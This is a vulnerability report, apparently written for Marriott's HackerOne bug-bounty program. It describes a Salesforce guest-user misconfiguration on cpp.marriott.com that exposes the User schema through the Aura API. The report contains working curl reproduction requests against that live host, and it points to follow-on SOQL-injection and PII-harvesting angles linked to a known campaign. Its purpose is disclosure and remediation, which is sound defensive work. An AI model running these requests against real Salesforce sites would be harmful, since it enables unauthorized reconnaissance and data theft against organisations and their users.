# M002 — Unauthenticated Salesforce Aura API Exposes User Object Schema (Guest User Misconfiguration)

**Target:** `cpp.marriott.com`  
**Endpoint:** `POST /s/sfsites/aura`  
**Severity:** Medium  
**CVSS 3.1:** `AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N` → **5.3**  
**CWE:** CWE-284 (Improper Access Control), CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor)  
**Status:** Report-ready  
**Discovered:** 2026-06-21 (Session 2), confirmed + chain-tested 2026-06-22 (Sessions 3, 4, 6, 7)  
**Researcher IP used during testing:** [Pi external IP — redact before submission]  
**Tools:** curl 7.x  

---

## Summary

The Salesforce Experience Cloud (Community Cloud) deployment at `cpp.marriott.com` has its Guest User profile configured with Aura API access enabled. Any unauthenticated internet user can POST to the Lightning Aura endpoint `/s/sfsites/aura` and invoke Aura controller actions. The `getObjectInfo` action on the `User` sObject returns a successful response (`"state":"SUCCESS"`) containing **203 field definitions** from the Marriott Salesforce User schema, including field API names, labels, and data types for sensitive fields such as `Email`, `FirstName`, `LastName`, `Address`, `City`, `CompanyName`, `CommunityNickname`, and `HasUserVerifiedEmail`. This misconfiguration matches the attack class exploited by the ShinyHunters group in March 2026 against multiple Salesforce Community Cloud deployments.

While direct record access (individual user data) is blocked for the guest profile on this org, schema exposure provides an attacker with the full field map needed to craft precise data exfiltration queries if any further access control gaps are identified (e.g., via SOQL injection, controller misconfig, or a different Community page with relaxed permissions). Standalone, this constitutes information disclosure of Marriott's internal Salesforce data model to unauthenticated users.

---

## Vulnerability Details

### Background: Salesforce Guest User API misconfiguration

Salesforce Experience Cloud sites expose a Lightning Aura API at `/s/sfsites/aura`. When the "Guest User" profile (the anonymous access profile assigned to unauthenticated Community visitors) has "API Enabled" permission set, unauthenticated callers can invoke Aura controller actions.

The correct configuration is to disable API access for the Guest User profile. This is a documented security hardening requirement in Salesforce's Trust and Compliance documentation.

### Confirmed behavior

1. `GET https://cpp.marriott.com/s/sfsites/aura` → **HTTP 200** (endpoint accessible)
2. `POST https://cpp.marriott.com/s/sfsites/aura` with `aura.token=undefined` and `ACTION$getObjectInfo` for `User` sObject → **`"state":"SUCCESS"`** with full 203-field schema response
3. `getObjectInfo` on `Contact`, `Account`, `Lead`, `Opportunity` → `"state":"ERROR"` (those objects are restricted for guest)
4. `getItems` (record fetch) on `User` → internal server error (not "access denied" — the call reaches server code, but list view config is absent or erroring)
5. REST API (`/services/data/`) → HTTP 200 with version list (public Salesforce behavior, not a finding on its own)
6. REST sObjects API with guest session cookie → HTTP 401 `INVALID_SESSION_ID` (REST blocked)
7. LWC (Lightning Web Component) wire endpoints also exposed: `/s/sfsites/lwr/` → HTTP 200 / 1368B, `/s/sfsites/lwr/fetch` → HTTP 200 / 1383B (different API from Aura with potentially different access controls — unexplored)
8. Salesforce org instance identified: `usa850` (via static asset URL `https://a.static.lightning.force.com/usa850.sfdc-8tgtt5` found in error response body)

### Fields exposed in User schema (sample)

The 203-field response includes (but is not limited to):

| Field API Name | Label | Type |
|----------------|-------|------|
| `Email` | Email | Email |
| `FirstName` | First Name | String |
| `LastName` | Last Name | String |
| `Address` | Address | Address |
| `City` | City | String |
| `CompanyName` | Company | String |
| `CommunityNickname` | Community Nickname | String |
| `HasUserVerifiedEmail` | Has User Verified Email | Boolean |
| `Phone` | Phone | Phone |
| `MobilePhone` | Mobile | Phone |
| `BannerPhotoUrl` | Banner Photo URL | Url |
| `UserType` | User Type | Picklist |
| `IsActive` | Active | Boolean |
| `ContactId` | Contact ID | Reference |
| `AccountId` | Account ID | Reference |

These are schema definitions (field names, types, labels) — not records. However, they reveal the Marriott Salesforce data model in detail.

---

## Reproduction Steps

**Prerequisites:** No account required. No cookies. No prior interaction with the site.

**Step 1:** Verify the Aura endpoint is accessible:

```bash
curl -sk -o /dev/null -w "%{http_code}" "https://cpp.marriott.com/s/sfsites/aura"
# Expected: 200
```

**Step 2:** Invoke `getObjectInfo` on User as an unauthenticated guest:

```bash
curl -sk -X POST "https://cpp.marriott.com/s/sfsites/aura" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"aura://RecordUiController/ACTION$getObjectInfo","callingDescriptor":"UNKNOWN","params":{"objectApiName":"User"}}]}' \
  --data-urlencode 'aura.context={"mode":"PROD","fwuid":"NOT_FOUND","app":"siteforce:communityApp","loaded":{},"dn":[],"globals":{},"uad":true}' \
  --data-urlencode 'aura.pageURI=/s/' \
  --data-urlencode 'aura.token=undefined' \
  | python3 -c "
import sys, json
data = sys.stdin.read()
start = data.index('{')
obj = json.loads(data[start:])
actions = obj.get('actions', [])
for a in actions:
    print('state:', a.get('state'))
    ret = a.get('returnValue', {})
    fields = ret.get('fields', {})
    print('field_count:', len(fields))
    for k, v in list(fields.items())[:10]:
        print(' ', k, '->', v.get('label',''), '(', v.get('dataType',''), ')')
"
```

**Expected output:**

```
state: SUCCESS
field_count: 203
  AboutMe -> About Me ( String )
  AccountId -> Account ID ( Reference )
  Address -> Address ( Address )
  Alias -> Alias ( String )
  BadgeText -> User Opt Out of Chatter -> ... ( String )
  BannerPhotoUrl -> Banner Photo URL ( Url )
  City -> City ( String )
  CommunityNickname -> Community Nickname ( String )
  CompanyName -> Company ( String )
  ContactId -> Contact ID ( Reference )
```

**Step 3 (contrast — confirm other objects are restricted):**

```bash
curl -sk -X POST "https://cpp.marriott.com/s/sfsites/aura" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"aura://RecordUiController/ACTION$getObjectInfo","callingDescriptor":"UNKNOWN","params":{"objectApiName":"Contact"}}]}' \
  --data-urlencode 'aura.context={"mode":"PROD","fwuid":"NOT_FOUND","app":"siteforce:communityApp","loaded":{},"dn":[],"globals":{},"uad":true}' \
  --data-urlencode 'aura.pageURI=/s/' \
  --data-urlencode 'aura.token=undefined' \
  | python3 -c "import sys,json; d=sys.stdin.read(); obj=json.loads(d[d.index('{'):]); [print('state:',a.get('state')) for a in obj.get('actions',[])]"
# Expected: state: ERROR  (Contact blocked for guest — contrast demonstrates User is misconfigured)
```

---

## Impact

### Direct impact
- **Unauthenticated schema disclosure**: Full Marriott Salesforce User data model (203 fields) exposed. This enables an attacker to:
  - Enumerate valid field names for follow-on SOQL injection attempts in other Community pages or Aura controllers
  - Understand the data structure of Marriott's Salesforce org (relationships between User/Contact/Account objects)
  - Craft targeted queries if any Aura controller on the site executes SOQL with guest access

### Context: cpp.marriott.com
The site appears to be a partner/franchisee portal ("Community Partner Portal" — CPP). Salesforce Community users in this org likely include Marriott's hotel owners, franchise partners, or corporate partners — a high-value target for business email compromise and credential theft.

### Exploitation class (ShinyHunters March 2026)
This matches the exact attack class used by ShinyHunters in their March 2026 campaign against Salesforce Experience Cloud deployments. In vulnerable orgs where `getItems` or SOQL-enabled controllers are accessible to guest users, the full attack yields PII for all community members. This org's guest profile appears to block record access, limiting the current severity to Medium — but the underlying misconfiguration class is the same.

---

## Root Cause

The Salesforce Guest User profile for the `cpp.marriott.com` Experience Cloud site has "API Enabled" checked in Salesforce Setup → Profiles → Guest User Profile. This is a misconfiguration; the Guest User profile should not have API access.

Additionally, the `getObjectInfo` Aura controller action is not restricted to authenticated profiles for the `User` sObject, allowing schema introspection without credentials.

---

## Remediation

1. **Primary fix:** In Salesforce Setup → Digital Experiences → [Site Name] → Administration → Guest User Profile → Uncheck "API Enabled". This prevents unauthenticated callers from invoking Aura API actions.
2. **Verify FLS/CRUD on Guest User Profile:** Ensure the Guest User profile has no Read access to the `User` sObject or any sObject containing PII.
3. **Review Aura controller permissions:** Audit all custom Aura controllers exposed on this Community site for whether they enforce `with sharing` and require authenticated sessions before executing SOQL queries.
4. **Follow Salesforce Security hardening guide:** Salesforce published explicit hardening guidance for Experience Cloud Guest User permissions in 2021 (Security Advisory: Salesforce Community Site Guest User Permissions).

---

## References

- Salesforce Security Advisory — Guest User Permissions (2021): https://help.salesforce.com/s/articleView?id=000356268
- Salesforce Trust — Experience Cloud Guest User Hardening: https://help.salesforce.com/s/articleView?id=sf.networks_guest_user_profile.htm
- ShinyHunters Salesforce Aura campaign (March 2026) — see public reporting
- CWE-284: Improper Access Control  
- CWE-200: Exposure of Sensitive Information to an Unauthorized Actor  
- HackerOne Marriott program: https://hackerone.com/marriott  
